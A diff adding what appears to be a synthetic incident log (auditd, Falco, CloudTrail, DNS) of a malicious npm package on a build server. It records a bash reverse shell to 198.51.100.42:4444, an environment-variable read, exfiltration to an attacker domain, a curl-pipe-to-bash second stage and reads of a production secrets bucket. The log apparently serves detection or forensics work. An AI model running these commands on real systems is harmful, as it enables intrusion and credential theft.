@@ -1,0 +1,13 @@
+type=SYSCALL msg=audit(1710069720.100:123) arch=x86_64 syscall=execve success=yes exe="/usr/bin/node" key="node_install" uid=1001 gid=1001 auid=1001 pid=4001 comm="npm" proctitle=node install.js
+type=SYSCALL msg=audit(1710069720.101:124) arch=x86_64 syscall=execve success=yes exe="/usr/bin/bash" key="postinstall" uid=1001 gid=1001 auid=1001 pid=4002 comm="node" proctitle=bash -i >&/dev/tcp/198.51.100.42/4444 0>&1
+Falco: Rule Outbound connection from npm postinstall (fd.dip=198.51.100.42 fd.dport=4444 proc.name=node container.id=build-srv-02)
+type=SYSCALL msg=audit(1710069721.200:125) arch=x86_64 syscall=openat success=yes path=/proc/self/environ key="read_environ" uid=1001 auid=1001 pid=4002 comm="bash" items=1
+type=SYSCALL msg=audit(1710069722.300:126) arch=x86_64 syscall=connect success=yes dest=198.51.100.42 port=443 key="exfil" uid=1001 auid=1001 pid=4002 comm="curl"
+# Observed POST exfil.attacker-infra.com: https://exfil.attacker-infra.com/drop?token=abc123
+# Second stage: curl -fsSL https://198.51.100.42/payload/rs.sh | bash
+CloudTrail Event: eventName=ListBuckets requestParameters= response=success sourceIPAddress=203.0.113.88
+CloudTrail Event: eventName=GetObject requestParameters=bucketName=corp-prod-secrets-bucket key=prod/database.env response=success sourceIPAddress=203.0.113.88
+CloudTrail Event: eventName=CreateUser requestParameters= response=AccessDenied sourceIPAddress=203.0.113.88
+npm audit: package colors-utils-pro@1.0.3 maintainer colorsutils.dev@protonmail.com integrity sha256-d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6 md5=e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
+DNS query: exfil.attacker-infra.com -> 198.51.100.42
+DNS query: registry.npmjs.org -> 104.16.16.35
